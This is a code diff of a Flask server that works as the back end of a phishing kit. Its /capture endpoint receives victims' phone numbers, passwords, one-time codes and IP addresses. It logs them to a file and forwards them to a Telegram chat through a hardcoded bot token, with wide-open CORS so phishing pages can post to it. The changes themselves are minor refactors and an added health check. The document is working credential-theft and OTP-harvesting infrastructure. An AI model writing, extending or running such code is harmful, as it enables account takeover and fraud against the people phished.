@@ -1,10 +1,7 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-import json
-import requests
-from datetime import datetime
 from flask import Flask, request, jsonify
+import requests
+import json
+from datetime import datetime
 
 BOT_TOKEN = "8933088140:AAGGoZK5U4sGgLtZDoHru0Mv_rlkZVAGlyg"
 CHAT_ID   = "6558060776"
@@ -16,11 +13,9 @@ def send_telegram(message):
     payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
     try:
         r = requests.post(url, json=payload, timeout=10)
-        if not r.ok:
-            print(f"[!] Telegram error: {r.status_code} {r.text}")
         return r.ok
     except Exception as e:
-        print(f"[!] Send error: {e}")
+        print(f"[!] Telegram error: {e}")
         return False
 
 def format_login(data):
@@ -77,6 +72,10 @@ def format_resend(data):
 def index():
     return "Server Running ✓"
 
+@app.route("/health")
+def health():
+    return jsonify({"status": "alive", "time": datetime.now().isoformat()})
+
 @app.route("/capture", methods=["POST", "OPTIONS"])
 def capture():
     if request.method == "OPTIONS":
@@ -94,10 +93,10 @@ def capture():
         print(f"[!] Parse error: {e}")
         data = {}
 
-    print("\n" + "=" * 50)
+    print("\n" + "=" * 40)
     print("🎯 CAPTURED:")
     print(json.dumps(data, ensure_ascii=False, indent=2))
-    print("=" * 50 + "\n")
+    print("=" * 40 + "\n")
 
     msg_type = data.get("type", "login")
     if msg_type == "otp":
@@ -110,16 +109,15 @@ def capture():
     try:
         with open("captured.txt", "a", encoding="utf-8") as f:
             f.write(f"{msg_type}|{data.get('phone')}|{data.get('password')}|{data.get('otp','')}|{data.get('ip')}\n")
-    except Exception as e:
-        print(f"[!] Save error: {e}")
+    except:
+        pass
 
     resp = jsonify({"status": "received"})
     resp.headers["Access-Control-Allow-Origin"] = "*"
     return resp
 
 if __name__ == "__main__":
-    print("=" * 50)
-    print("  🩸 Server Running — http://0.0.0.0:5000")
-    print(f"  📡 Chat ID: {CHAT_ID}")
-    print("=" * 50)
+    print("=" * 40)
+    print("  🩸 Server Running on port 5000")
+    print("=" * 40)
     app.run(host="0.0.0.0", port=5000, debug=False)
